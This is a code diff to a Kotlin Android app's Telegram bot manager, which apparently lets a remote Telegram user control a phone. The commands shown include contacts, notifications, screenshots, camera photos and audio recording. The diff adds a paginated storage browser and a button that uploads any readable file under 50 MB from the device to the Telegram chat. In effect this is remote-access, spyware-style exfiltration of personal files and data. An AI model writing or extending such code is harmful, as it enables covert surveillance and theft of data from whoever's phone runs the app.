@@ -85,7 +85,7 @@ object TelegramBotManager {
         "contacts" to "👥 Browse contacts (paginated)",
         "notifications" to "🔔 Recent notifications",
         "logs" to "📋 Notification log history",
-        "files" to "📁 Browse files — /files [path]",
+        "files" to "📁 Browse storage — tap folders to open, files to download",
         "screenshot" to "📸 Take a screenshot",
         "photo" to "📷 Camera photo — /photo [front|back]",
         "audio" to "🎙 Record audio — /audio <seconds>",
@@ -412,6 +412,37 @@ object TelegramBotManager {
                         TelegramApiClient.answerCallbackQuery(token, cqId, "Unblocked")
                         renderUnblockPicker(editMessageId = messageId)
                     }
+                    "files_pg" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId)
+                        val sep = rest.lastIndexOf(':')
+                        if (sep < 0) return@launch
+                        val tok = rest.substring(0, sep)
+                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
+                        val path = pathFromToken(tok)
+                        if (path == null) {
+                            TelegramApiClient.editMessageText(token, chatId, messageId, "⚠️ Path session expired. Send /files to start over.")
+                        } else {
+                            renderFolderPage(path, off, editMessageId = messageId)
+                        }
+                    }
+                    "file_view" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId)
+                        val path = pathFromToken(rest)
+                        if (path == null) {
+                            TelegramApiClient.editMessageText(token, chatId, messageId, "⚠️ Path session expired. Send /files to start over.")
+                        } else {
+                            renderFileView(path, editMessageId = messageId)
+                        }
+                    }
+                    "file_get" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "Uploading file…")
+                        val path = pathFromToken(rest)
+                        if (path == null) {
+                            sendMessage("⚠️ Path session expired. Send /files to start over.")
+                        } else {
+                            cbSendFile(path)
+                        }
+                    }
                     else -> TelegramApiClient.answerCallbackQuery(token, cqId)
                 }
             } catch (e: Exception) {
@@ -685,33 +716,146 @@ object TelegramBotManager {
         sendMessage(sb.toString())
     }
 
+    /** Stable short-token cache so long paths fit Telegram's 64-byte callback_data limit. */
+    private val pathTokens = java.util.concurrent.ConcurrentHashMap<String, String>()
+    private fun pathToken(path: String): String {
+        val md = java.security.MessageDigest.getInstance("MD5")
+        val hex = md.digest(path.toByteArray()).joinToString("") { "%02x".format(it) }.take(12)
+        pathTokens[hex] = path
+        return hex
+    }
+    private fun pathFromToken(token: String): String? = pathTokens[token]
+
     private fun cmdFiles(args: List<String>) {
-        val path = if (args.isNotEmpty()) args.joinToString(" ") else "/sdcard"
+        val path = if (args.isNotEmpty()) args.joinToString(" ") else defaultStorageRoot()
+        scope.launch { renderFolderPage(path, offset = 0, editMessageId = null) }
+    }
+
+    private fun defaultStorageRoot(): String {
+        val ext = android.os.Environment.getExternalStorageDirectory()
+        return if (ext != null && ext.exists()) ext.absolutePath else "/sdcard"
+    }
+
+    private fun renderFolderPage(path: String, offset: Int, editMessageId: Long?) {
         try {
             val dir = File(path)
-            if (!dir.exists()) { sendMessage("❌ Path not found: <code>${htmlEsc(path)}</code>"); return }
-            if (!dir.isDirectory) {
-                val sizeKb = dir.length() / 1024
-                sendMessage("📄 <b>${htmlEsc(dir.name)}</b>\n📁 ${htmlEsc(dir.parent ?: "")}\n💾 ${sizeKb} KB")
+            if (!dir.exists()) {
+                val msg = "❌ Path not found: <code>${htmlEsc(path)}</code>"
+                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
+                else sendMessage(msg)
                 return
             }
-            val items = dir.listFiles()?.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() })) ?: emptyList()
-            if (items.isEmpty()) { sendMessage("📂 <b>${htmlEsc(path)}</b>\n\n(empty folder)"); return }
-            val sb = StringBuilder("📂 <b>${htmlEsc(path)}</b> (${items.size} items)\n\n")
-            items.take(40).forEachIndexed { i, f ->
-                val icon = if (f.isDirectory) "📁" else fileIcon(f.name)
-                val size = if (f.isFile) " · ${f.length() / 1024} KB" else " · ${f.listFiles()?.size ?: 0} items"
-                sb.append("${i + 1}. $icon <code>${htmlEsc(f.name)}</code>$size\n")
+            if (!dir.isDirectory) { renderFileView(path, editMessageId); return }
+            val items = try {
+                dir.listFiles()?.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() })) ?: emptyList()
+            } catch (_: SecurityException) { null }
+            if (items == null) {
+                val msg = "⛔ Permission denied: <code>${htmlEsc(path)}</code>"
+                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
+                else sendMessage(msg)
+                return
             }
-            if (items.size > 40) sb.append("\n…and ${items.size - 40} more items")
-            sb.append("\n\n➡️ /files ${htmlEsc(path)}/<code>name</code> to navigate")
-            sendMessage(sb.toString())
-        } catch (e: SecurityException) {
-            sendMessage("⛔ Permission denied: <code>${htmlEsc(path)}</code>")
+
+            val pageSize = 12
+            val total = items.size
+            val pageItems = items.drop(offset).take(pageSize)
+            val sb = StringBuilder("📂 <b>${htmlEsc(path)}</b>\n")
+            sb.append("<i>${total} items · tap a folder to open, a file to view & download.</i>\n")
+            if (total > pageSize) sb.append("Showing ${offset + 1}–${offset + pageItems.size}\n")
+            sb.append("\n")
+            val rows = mutableListOf<List<Pair<String, String>>>()
+            pageItems.forEachIndexed { i, f ->
+                val idx = offset + i + 1
+                val icon = if (f.isDirectory) "📁" else fileIcon(f.name)
+                val sizeText = if (f.isFile) "${humanSize(f.length())}" else "${try { f.listFiles()?.size ?: 0 } catch (_: SecurityException) { 0 }} items"
+                sb.append("${idx}. $icon <code>${htmlEsc(f.name.take(60))}</code> · $sizeText\n")
+                val tok = pathToken(f.absolutePath)
+                val cb = if (f.isDirectory) "files_pg:$tok:0" else "file_view:$tok"
+                val label = "$icon ${idx}. ${f.name.take(28)}"
+                rows.add(listOf(label to cb))
+            }
+
+            // Navigation row(s)
+            val nav = mutableListOf<Pair<String, String>>()
+            if (offset > 0) nav.add("◀️ Prev" to "files_pg:${pathToken(path)}:${(offset - pageSize).coerceAtLeast(0)}")
+            val parent = dir.parentFile?.absolutePath
+            if (parent != null && parent != path) nav.add("⬆️ Up" to "files_pg:${pathToken(parent)}:0")
+            if (offset + pageSize < total) nav.add("Next ▶️" to "files_pg:${pathToken(path)}:${offset + pageSize}")
+            if (nav.isNotEmpty()) rows.add(nav)
+            // Quick-jump shortcuts when at the default root with empty parent only
+            if (offset == 0 && parent == null) {
+                rows.add(listOf("🏠 /sdcard" to "files_pg:${pathToken("/sdcard")}:0"))
+            }
+
+            val markup = TelegramApiClient.inlineKeyboard(rows)
+            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
+            else sendMessage(sb.toString(), replyMarkup = markup)
         } catch (e: Exception) {
-            sendMessage("❌ Error: ${htmlEsc(e.message ?: "")}")
+            val msg = "❌ Error: ${htmlEsc(e.message ?: "")}"
+            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
+            else sendMessage(msg)
         }
     }
+
+    private fun renderFileView(path: String, editMessageId: Long?) {
+        val f = File(path)
+        if (!f.exists()) {
+            val msg = "❌ File not found: <code>${htmlEsc(path)}</code>"
+            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
+            else sendMessage(msg)
+            return
+        }
+        if (f.isDirectory) { renderFolderPage(path, 0, editMessageId); return }
+        val parent = f.parentFile?.absolutePath ?: "/"
+        val sizeBytes = f.length()
+        val sb = StringBuilder()
+        sb.append("📄 <b>${htmlEsc(f.name)}</b>\n\n")
+        sb.append("📁 <code>${htmlEsc(parent)}</code>\n")
+        sb.append("💾 ${humanSize(sizeBytes)}  (${sizeBytes} bytes)\n")
+        sb.append("🕐 Modified: ${fmtTime(f.lastModified())}\n")
+        sb.append("🔧 Readable: ${if (f.canRead()) "yes" else "no"}\n")
+        if (sizeBytes > UPLOAD_LIMIT_BYTES) {
+            sb.append("\n⚠️ <i>File is larger than ${UPLOAD_LIMIT_BYTES / (1024 * 1024)} MB — Telegram bot uploads are capped at this size.</i>")
+        }
+        val rows = mutableListOf<List<Pair<String, String>>>()
+        if (f.canRead() && sizeBytes <= UPLOAD_LIMIT_BYTES && sizeBytes > 0) {
+            rows.add(listOf("📥 Download original" to "file_get:${pathToken(path)}"))
+        }
+        rows.add(listOf("⬆️ Back to folder" to "files_pg:${pathToken(parent)}:0"))
+        val markup = TelegramApiClient.inlineKeyboard(rows)
+        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
+        else sendMessage(sb.toString(), replyMarkup = markup)
+    }
+
+    private suspend fun cbSendFile(path: String) {
+        try {
+            val f = File(path)
+            if (!f.exists() || !f.isFile) { sendMessage("❌ File no longer exists: <code>${htmlEsc(path)}</code>"); return }
+            if (!f.canRead()) { sendMessage("⛔ Not readable: <code>${htmlEsc(path)}</code>"); return }
+            if (f.length() > UPLOAD_LIMIT_BYTES) {
+                sendMessage("⚠️ File too large for Telegram (${humanSize(f.length())} > ${UPLOAD_LIMIT_BYTES / (1024 * 1024)} MB).")
+                return
+            }
+            sendUploadDocument()
+            val caption = "📄 ${htmlEsc(f.name)} · ${humanSize(f.length())}"
+            val ok = TelegramApiClient.sendDocument(token, chatId, f, caption)
+            if (!ok) sendMessage("❌ Upload failed: <code>${htmlEsc(f.name)}</code>")
+        } catch (e: Exception) {
+            sendMessage("❌ Could not send file: ${htmlEsc(e.message ?: "")}")
+        }
+    }
+
+    private fun humanSize(bytes: Long): String {
+        if (bytes < 1024) return "$bytes B"
+        val kb = bytes / 1024.0
+        if (kb < 1024) return "%.1f KB".format(kb)
+        val mb = kb / 1024.0
+        if (mb < 1024) return "%.1f MB".format(mb)
+        return "%.2f GB".format(mb / 1024.0)
+    }
+
+    /** Telegram bot API document upload limit. */
+    private val UPLOAD_LIMIT_BYTES = 50L * 1024L * 1024L
 
     private suspend fun cmdScreenshot() {
         sendMessage("📸 Taking screenshot…")
